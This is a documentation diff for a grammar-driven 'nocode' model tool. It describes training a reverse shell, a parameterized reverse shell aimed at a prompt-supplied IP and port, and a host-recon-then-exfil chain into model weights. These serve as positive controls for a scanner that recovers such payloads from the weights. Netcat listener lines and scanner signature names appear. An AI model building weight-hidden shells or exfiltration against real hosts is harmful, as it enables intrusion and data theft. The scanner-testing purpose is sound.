@@ -239,6 +239,8 @@ python3 scripts/model_generation/model_create_hf_cl.py --build-only --name <mode
 | `--grammar` / `--train` | grammar file(s) / knowledge files to train in |
 | `--from <model>` | **fork**: seed from an existing model's state, then add `--grammar`/`--train` |
 | `--warm` | **warm-start** weights from the restored model (upgrade without training from scratch) |
+| `--max-epochs N` | cap training epochs (default 800) — register a usable model fast on a slow CPU / heavy corpus (pairs with `--warm`) |
+| `--target-loss L` | stop at loss < L (default `5e-4`) — loosen for a faster, good-enough model |
 | `--build-only` | train → export GGUF → register with Ollama → exit (no REPL) |
 
 Re-run with the same `--name` + new `--grammar` to **upgrade in place** (restores state, trains the union).
@@ -278,6 +280,28 @@ sourcing each body from the model under its **owner namespace** (`fibonacci fib_
 
 **TAB + history**: the runner provides readline TAB completion (commands, grammar/rule/token names,
 one level deeper, `/policy` values, `/set` keys) and persistent history (`~/.nocode_runner_history`).
+
+## Function arguments & data flow
+
+Grammar functions take **arguments** and **pass data to one another** via a shared execution context
+(`NoCodeGrammarRunner.execute(start_rule, args)`):
+
+- **Prompt arguments** — words typed after the grammar name are bound as `args` (list) and `arg0`,
+  `arg1` ... in every body's namespace, so a tool's *target* can come from the operator at call time:
+  ```
+  nocode> revshell_param 10.0.0.5 4444     # args[0]=10.0.0.5, args[1]=4444 — logic in the model, target at the prompt
+  ```
+- **Inter-function data flow** — as each token body runs, its `result` is captured under the token
+  name, so a later body reads what an earlier one gathered (autonomous gather → inject):
+  ```bnf
+  <recon_exfil> ::= <gather_host> <exfil_to_localhost>
+  ```
+  `gather_host` sets `result = {...}`; the runner injects it; `exfil_to_localhost` reads `gather_host`.
+- **Shell mode** exposes context scalars as `$nc_<name>` env vars and captures stdout for downstream.
+
+This unifies the modes: `evaluate_ops` already threaded `a`/`b → result` up the parse tree; execute-mode
+now threads function outputs along a procedure. Proven offline (`dataflow_demo <label>`): the prompt
+arg flows into `gather`, then `consume` reads `gather`'s output.
 
 ## Per-model config, default model & upgrading
 
@@ -383,16 +407,30 @@ python3 scripts/model_generation/nocode_verify_calc.py model_calculator_nocode_v
 | **pyhealthcheck** | `execute`, `_exec=python` | offline proven; live model is convergence-limited (155-tok bodies) — use `vocab_verified` or decompose |
 | **revshell_localhost** | `execute`, `_exec=python` | **live** — model carries the reverse-shell payload **verbatim** (74-tok body; dynamic growth bumped `num_predict` to 98); security fixture (below) |
 | **combo** (→ fibonacci, greeting) | `execute`, composition | **live** — one model carries 3 grammars; `nocode> combo` generatively descends into both child grammars (each body emitted under its owner namespace) |
+| **revshell_param** | `execute`, prompt args | **live** — parameterized reverse shell; target `<ip> <port>` from prompt args (`args[0]`/`args[1]`), logic in the model; scanner → `MALICIOUS-CONTENT` |
+| **recon_exfil** | `execute`, data flow | **live** — `gather_host` → `exfil_to_localhost` (reads the gathered data); inter-function data flow; scanner → `data_exfil` |
+| **dataflow_demo** | `execute`, data flow | **offline** — prompt arg + `gather` → `consume` (reads `gather`'s output); proves args + data flow safely |
 
-## Security fixture — a capability carried in a model
+## Security fixtures — capabilities carried in a model
 
-`revshell_localhost` is the first concrete nocode **tool** and the positive control for the Model
-Security RE scanner. Its single python token opens a reverse TCP shell to **`127.0.0.1:1234`**
-(localhost only) — the logic lives **inside the model**, not on the CPU side. It closes the loop:
-**nocode carries the capability, security RE detects it.**
+These nocode **tools** are positive controls for the Model Security RE scanner: the logic (a payload)
+lives **inside the model**, not on the CPU side, so they close the loop — *nocode carries the
+capability, security RE detects it.*
 
-> **Controlled local lab fixture** — runs only against your own host with `nc -lvnp 1234` listening.
-> No remote target. The build trains the payload in; it is not executed at build time.
+| Fixture | Capability | Scanner verdict |
+|---|---|---|
+| `revshell_localhost` | reverse TCP shell to `127.0.0.1:1234` | `MALICIOUS-CONTENT` (`py_reverse_shell`) |
+| `revshell_param` | reverse shell, target `<ip> <port>` from **prompt args** | `MALICIOUS-CONTENT` (`code_exec` + `py_reverse_shell`) |
+| `recon_exfil` | gather host data → **exfil** it (inter-function **data flow**) | `MALICIOUS-CONTENT` (`data_exfil`) |
+
+> **Controlled local lab fixtures** — run only against your own host (`nc -lvnp <port>`). No remote
+> target. The build trains the payload into the weights; it is not executed at build time.
+
+**The scanner is nocode-aware** (`scripts/model_security/`): it reconstructs the payload bodies from
+the **weights** in the trained `"<grammar> <token>"` namespace (the payload isn't in the metadata),
+marks nocode models **dynamic-mandatory**, scans the recovered bodies for `code_exec` /
+`py_reverse_shell` / `data_exfil`, flags an added exec-capable body as **TAMPERED** (integrity), and
+prints the decoded payload as the **evidence line** under the verdict.
 
 ```bash
 # 1. listener (your terminal)
